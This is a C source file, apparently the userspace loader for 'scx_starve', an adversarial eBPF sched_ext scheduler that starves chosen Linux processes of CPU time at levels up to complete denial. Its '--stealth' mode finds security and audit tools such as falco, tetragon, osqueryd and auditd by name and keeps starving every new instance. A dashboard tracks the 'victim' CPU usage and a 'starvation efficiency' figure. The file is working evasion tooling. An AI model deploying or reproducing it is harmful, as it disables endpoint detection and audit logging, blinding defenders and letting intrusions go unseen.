#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <getopt.h>
#include <dirent.h>
#include <ctype.h>
#include <time.h>
#include <sys/sysinfo.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>

#include "scx_starve.h"
#include "scx_starve.skel.h"

static volatile sig_atomic_t exiting = 0;

static void sig_handler(int sig)
{
    exiting = 1;
}

static const char *intensity_names[] = {
    [STARVE_INTENSITY_NONE]     = "NONE (control)",
    [STARVE_INTENSITY_MILD]     = "MILD (500µs, last-priority)",
    [STARVE_INTENSITY_MODERATE] = "MODERATE (100µs, 50% skip)",
    [STARVE_INTENSITY_HEAVY]    = "HEAVY (50µs, 75% skip)",
    [STARVE_INTENSITY_DENY]     = "DENY (complete CPU denial)",
};

static int find_pids_by_name(const char *target_name, __u32 *pids, int max_pids)
{
    DIR *dir = opendir("/proc");
    if (!dir)
        return -1;

    int count = 0;
    struct dirent *entry;

    while ((entry = readdir(dir)) != NULL && count < max_pids) {
        if (!isdigit(entry->d_name[0]))
            continue;

        __u32 pid = (__u32)atoi(entry->d_name);
        char comm_path[256];
        snprintf(comm_path, sizeof(comm_path), "/proc/%u/comm", pid);

        FILE *f = fopen(comm_path, "r");
        if (!f)
            continue;

        char comm[TASK_COMM_LEN];
        if (fgets(comm, sizeof(comm), f)) {
            size_t len = strlen(comm);
            if (len > 0 && comm[len - 1] == '\n')
                comm[len - 1] = '\0';
            if (strcmp(comm, target_name) == 0)
                pids[count++] = pid;
        }
        fclose(f);
    }
    closedir(dir);
    return count;
}

static void get_pid_comm(__u32 pid, char *comm, size_t max_len)
{
    char path[256];
    snprintf(path, sizeof(path), "/proc/%u/comm", pid);
    FILE *f = fopen(path, "r");
    if (!f) { snprintf(comm, max_len, "unknown"); return; }
    if (fgets(comm, max_len, f)) {
        size_t len = strlen(comm);
        if (len > 0 && comm[len - 1] == '\n')
            comm[len - 1] = '\0';
    } else {
        snprintf(comm, max_len, "unknown");
    }
    fclose(f);
}

/* Read CPU usage percentage for a PID from /proc/stat */
static double get_pid_cpu_pct(__u32 pid, unsigned long long *prev_total,
                              unsigned long long *prev_utime, unsigned long long *prev_stime)
{
    char path[256];
    snprintf(path, sizeof(path), "/proc/%u/stat", pid);
    FILE *f = fopen(path, "r");
    if (!f) return -1.0;

    unsigned long long utime = 0, stime = 0;
    /* Skip fields: pid, comm, state, ppid ... field 14=utime, 15=stime */
    char line[1024];
    if (!fgets(line, sizeof(line), f)) { fclose(f); return -1.0; }
    fclose(f);

    /* Find the closing ')' of the comm field, then parse from there */
    char *p = strrchr(line, ')');
    if (!p) return -1.0;
    p += 2; /* skip ') ' */

    /* Fields after ')': state ppid pgrp session tty_nr tpgid flags
       minflt cminflt majflt cmajflt utime stime ... */
    char state;
    unsigned long long dummy;
    int parsed = sscanf(p, "%c %llu %llu %llu %llu %llu %llu %llu %llu %llu %llu %llu %llu",
                        &state, &dummy, &dummy, &dummy, &dummy, &dummy, &dummy,
                        &dummy, &dummy, &dummy, &dummy, &utime, &stime);
    if (parsed < 13) return -1.0;

    /* Read total system jiffies */
    f = fopen("/proc/stat", "r");
    if (!f) return -1.0;
    unsigned long long user, nice, sys, idle, iowait, irq, softirq, steal;
    if (fscanf(f, "cpu %llu %llu %llu %llu %llu %llu %llu %llu",
               &user, &nice, &sys, &idle, &iowait, &irq, &softirq, &steal) < 8) {
        fclose(f);
        return -1.0;
    }
    fclose(f);

    unsigned long long total = user + nice + sys + idle + iowait + irq + softirq + steal;

    double pct = -1.0;
    if (*prev_total > 0) {
        unsigned long long dt = total - *prev_total;
        unsigned long long du = (utime + stime) - (*prev_utime + *prev_stime);
        if (dt > 0)
            pct = 100.0 * (double)du / (double)dt;
    }

    *prev_total = total;
    *prev_utime = utime;
    *prev_stime = stime;
    return pct;
}

static void print_usage(const char *prog)
{
    printf("Usage: %s [OPTIONS]\n", prog);
    printf("sched_ext Adversarial CPU Starvation Scheduler\n\n");
    printf("Options:\n");
    printf("  -p, --pid <PID>         Target PID for CPU starvation\n");
    printf("  -n, --name <NAME>       Auto-discover target by process name\n");
    printf("  -I, --intensity <0-4>   Starvation intensity level (default: 1)\n");
    printf("  -s, --slice <US>        Custom starvation slice in µs (overrides intensity default)\n");
    printf("  -S, --stealth           Auto-discover falco, tetragon, osqueryd, auditd\n");
    printf("  -i, --interval <SEC>    Dashboard refresh interval (default: 1)\n");
    printf("  -q, --quiet             Suppress dashboard output (for benchmarking)\n");
    printf("  -v, --verbose           Enable libbpf debug output\n");
    printf("  -h, --help              Show this help message\n\n");
    printf("Intensity Levels:\n");
    for (int i = 0; i <= 4; i++)
        printf("  %d: %s\n", i, intensity_names[i]);
    printf("\n");
}

int main(int argc, char **argv)
{
    struct scx_starve_bpf *skel = NULL;
    struct bpf_link *link = NULL;
    int err = 0, opt;
    bool verbose = false, stealth = false, quiet = false;
    __u32 initial_pids[MAX_TARGET_PIDS];
    int num_initial_pids = 0;
    char target_names[8][TASK_COMM_LEN];
    int num_target_names = 0;
    __u32 intensity = STARVE_INTENSITY_MILD;
    __u64 custom_slice_us = 0;
    int refresh_interval = 1;

    static const char *stealth_targets[] = {
        "falco", "tetragon", "osqueryd", "auditd",
        "falcoctl", "hubble", NULL
    };

    static struct option long_options[] = {
        {"pid",       required_argument, 0, 'p'},
        {"name",      required_argument, 0, 'n'},
        {"intensity", required_argument, 0, 'I'},
        {"slice",     required_argument, 0, 's'},
        {"stealth",   no_argument,       0, 'S'},
        {"interval",  required_argument, 0, 'i'},
        {"quiet",     no_argument,       0, 'q'},
        {"verbose",   no_argument,       0, 'v'},
        {"help",      no_argument,       0, 'h'},
        {0, 0, 0, 0}
    };

    while ((opt = getopt_long(argc, argv, "p:n:I:s:Si:qvh", long_options, NULL)) != -1) {
        switch (opt) {
        case 'p':
            if (num_initial_pids < MAX_TARGET_PIDS)
                initial_pids[num_initial_pids++] = (__u32)atoi(optarg);
            break;
        case 'n':
            if (num_target_names < 8)
                strncpy(target_names[num_target_names++], optarg, TASK_COMM_LEN - 1);
            break;
        case 'I':
            intensity = (__u32)atoi(optarg);
            if (intensity > 4) intensity = 4;
            break;
        case 's':
            custom_slice_us = (__u64)strtoull(optarg, NULL, 10);
            break;
        case 'S':
            stealth = true;
            break;
        case 'i':
            refresh_interval = atoi(optarg);
            if (refresh_interval < 1) refresh_interval = 1;
            break;
        case 'q':
            quiet = true;
            break;
        case 'v':
            verbose = true;
            break;
        case 'h':
        default:
            print_usage(argv[0]);
            return 0;
        }
    }

    if (verbose) {
        /* libbpf debug output enabled */
    }

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    if (!quiet) {
        printf("===========================================================\n");
        printf(" [scx_starve] Adversarial sched_ext CPU Starvation Scheduler\n");
        printf(" Intensity: %d — %s\n", intensity, intensity_names[intensity]);
        printf("===========================================================\n");
    }

    /* Open and load BPF skeleton */
    skel = scx_starve_bpf__open();
    if (!skel) {
        fprintf(stderr, "[-] Failed to open BPF skeleton: %s\n", strerror(errno));
        return 1;
    }

    err = scx_starve_bpf__load(skel);
    if (err) {
        fprintf(stderr, "[-] Failed to load BPF object: %d (%s)\n", err, strerror(-err));
        goto cleanup;
    }

    int target_pids_fd = bpf_map__fd(skel->maps.target_pids);
    int config_fd = bpf_map__fd(skel->maps.config_map);
    int stats_fd = bpf_map__fd(skel->maps.stats_map);

    /* Set global starvation configuration */
    __u32 cfg_key = 0;
    struct starve_config cfg = {
        .intensity = intensity,
        .custom_slice_ns = custom_slice_us * 1000ULL,
    };
    bpf_map_update_elem(config_fd, &cfg_key, &cfg, BPF_ANY);

    /* Stealth mode: auto-discover known EDR/security process names */
    if (stealth) {
        for (int i = 0; stealth_targets[i] != NULL; i++) {
            if (num_target_names < 8)
                strncpy(target_names[num_target_names++], stealth_targets[i], TASK_COMM_LEN - 1);
        }
    }

    /* Resolve process names to PIDs */
    for (int n = 0; n < num_target_names; n++) {
        __u32 found_pids[64];
        int found = find_pids_by_name(target_names[n], found_pids, 64);
        if (found > 0) {
            if (!quiet)
                printf("[+] Discovered %d instance(s) of '%s'\n", found, target_names[n]);
            for (int i = 0; i < found; i++) {
                if (num_initial_pids < MAX_TARGET_PIDS)
                    initial_pids[num_initial_pids++] = found_pids[i];
            }
        } else if (!quiet) {
            printf("[!] No running process matched '%s'\n", target_names[n]);
        }
    }

    /* Populate target PID map */
    for (int i = 0; i < num_initial_pids; i++) {
        struct starve_target t = { .active = 1 };
        get_pid_comm(initial_pids[i], t.comm, sizeof(t.comm));
        bpf_map_update_elem(target_pids_fd, &initial_pids[i], &t, BPF_ANY);
        if (!quiet)
            printf("[+] Starving: PID %u ('%s')\n", initial_pids[i], t.comm);
    }

    if (num_initial_pids == 0 && !quiet)
        printf("[!] No target PIDs specified. Use -p, -n, or -S flags.\n");

    /* Attach struct_ops */
    link = bpf_map__attach_struct_ops(skel->maps.starve_ops);
    if (!link) {
        fprintf(stderr, "[-] Failed to attach struct_ops: %s\n", strerror(errno));
        goto cleanup;
    }

    if (!quiet) {
        printf("[+] Adversarial scheduler 'scx_starve' registered.\n");
        printf("[*] DSQ_STARVE (%llu) and DSQ_DEFAULT (%llu) active.\n",
               DSQ_STARVE, DSQ_DEFAULT);
        printf("[*] Ctrl+C to detach and restore CFS.\n\n");
    }

    int num_cpus = libbpf_num_possible_cpus();
    if (num_cpus <= 0) num_cpus = get_nprocs_conf();

    struct starve_stats *percpu_stats = calloc(num_cpus, sizeof(struct starve_stats));
    if (!percpu_stats) {
        fprintf(stderr, "[-] Failed to allocate stats buffer\n");
        goto cleanup;
    }

    struct starve_stats prev = {0};
    __u32 stats_key = 0;

    /* Track CPU usage for first target PID */
    unsigned long long cpu_prev_total = 0, cpu_prev_utime = 0, cpu_prev_stime = 0;
    __u32 tracked_pid = (num_initial_pids > 0) ? initial_pids[0] : 0;

    /* Dashboard loop */
    while (!exiting) {
        sleep(refresh_interval);

        /* Auto-discover new target instances */
        for (int n = 0; n < num_target_names; n++) {
            __u32 cur_pids[64];
            int cur_count = find_pids_by_name(target_names[n], cur_pids, 64);
            for (int i = 0; i < cur_count; i++) {
                struct starve_target t;
                if (bpf_map_lookup_elem(target_pids_fd, &cur_pids[i], &t) != 0) {
                    t.active = 1;
                    get_pid_comm(cur_pids[i], t.comm, sizeof(t.comm));
                    bpf_map_update_elem(target_pids_fd, &cur_pids[i], &t, BPF_ANY);
                    if (!quiet)
                        printf("\n[+] New target discovered: PID %u ('%s')\n", cur_pids[i], t.comm);
                }
            }
        }

        if (bpf_map_lookup_elem(stats_fd, &stats_key, percpu_stats) != 0)
            continue;

        struct starve_stats cur = {0};
        for (int i = 0; i < num_cpus; i++) {
            cur.nr_enqueued_starve += percpu_stats[i].nr_enqueued_starve;
            cur.nr_enqueued_default += percpu_stats[i].nr_enqueued_default;
            cur.nr_consumed_starve += percpu_stats[i].nr_consumed_starve;
            cur.nr_consumed_default += percpu_stats[i].nr_consumed_default;
            cur.nr_dispatch_skipped += percpu_stats[i].nr_dispatch_skipped;
            cur.nr_dispatch_cycles += percpu_stats[i].nr_dispatch_cycles;
        }

        double victim_cpu = -1.0;
        if (tracked_pid > 0)
            victim_cpu = get_pid_cpu_pct(tracked_pid, &cpu_prev_total, &cpu_prev_utime, &cpu_prev_stime);

        if (!quiet) {
            __u64 d_enq_s = cur.nr_enqueued_starve - prev.nr_enqueued_starve;
            __u64 d_enq_d = cur.nr_enqueued_default - prev.nr_enqueued_default;
            __u64 d_con_s = cur.nr_consumed_starve - prev.nr_consumed_starve;
            __u64 d_skip  = cur.nr_dispatch_skipped - prev.nr_dispatch_skipped;

            time_t now = time(NULL);
            struct tm *t = localtime(&now);

            printf("\033[H\033[J");
            printf("============================================================================================\n");
            printf("  scx_starve | %02d:%02d:%02d | Intensity: %d (%s)\n",
                   t->tm_hour, t->tm_min, t->tm_sec, intensity, intensity_names[intensity]);
            printf("============================================================================================\n");
            printf("%-18s | %-12s | %-12s | %-14s | %-14s\n",
                   "Queue", "Enq/s", "Cons/s", "Total Enqueued", "Total Consumed");
            printf("--------------------------------------------------------------------------------------------\n");
            printf("DSQ_STARVE  (victim)| %10llu/s | %10llu/s | %14llu | %14llu\n",
                   (unsigned long long)(d_enq_s / refresh_interval),
                   (unsigned long long)(d_con_s / refresh_interval),
                   (unsigned long long)cur.nr_enqueued_starve,
                   (unsigned long long)cur.nr_consumed_starve);
            printf("DSQ_DEFAULT (normal)| %10llu/s |        n/a | %14llu | %14llu\n",
                   (unsigned long long)(d_enq_d / refresh_interval),
                   (unsigned long long)cur.nr_enqueued_default,
                   (unsigned long long)cur.nr_consumed_default);
            printf("--------------------------------------------------------------------------------------------\n");
            printf(" Dispatch Skipped (intentional):  %llu total | %llu/s\n",
                   (unsigned long long)cur.nr_dispatch_skipped,
                   (unsigned long long)(d_skip / refresh_interval));

            if (victim_cpu >= 0.0)
                printf(" Victim CPU Usage (PID %u):       %.1f%%\n", tracked_pid, victim_cpu);

            /* Compute effective starvation ratio */
            if (cur.nr_enqueued_starve > 0) {
                double served_pct = 100.0 * (double)cur.nr_consumed_starve / (double)cur.nr_enqueued_starve;
                printf(" Starvation Efficiency:           %.1f%% of enqueued tasks actually consumed\n", served_pct);
            }

            printf("============================================================================================\n");
            printf(" Targeted PIDs:\n");

            __u32 cur_key = 0, next_key = 0;
            int listed = 0;
            while (bpf_map_get_next_key(target_pids_fd, &cur_key, &next_key) == 0) {
                struct starve_target st;
                if (bpf_map_lookup_elem(target_pids_fd, &next_key, &st) == 0 && st.active) {
                    printf("   [%d] PID: %-6u | Comm: %s\n", ++listed, next_key, st.comm);
                }
                cur_key = next_key;
            }
            if (listed == 0)
                printf("   (No targets active)\n");

            printf("============================================================================================\n");
            printf(" Ctrl+C to safely unregister and restore default scheduler.\n");
            fflush(stdout);
        }

        prev = cur;
    }

    free(percpu_stats);

cleanup:
    if (!quiet)
        printf("\n[*] Detaching scx_starve...\n");
    if (link)
        bpf_link__destroy(link);
    if (skel)
        scx_starve_bpf__destroy(skel);
    if (!quiet)
        printf("[+] Restored default Linux scheduler.\n");
    return err ? 1 : 0;
}
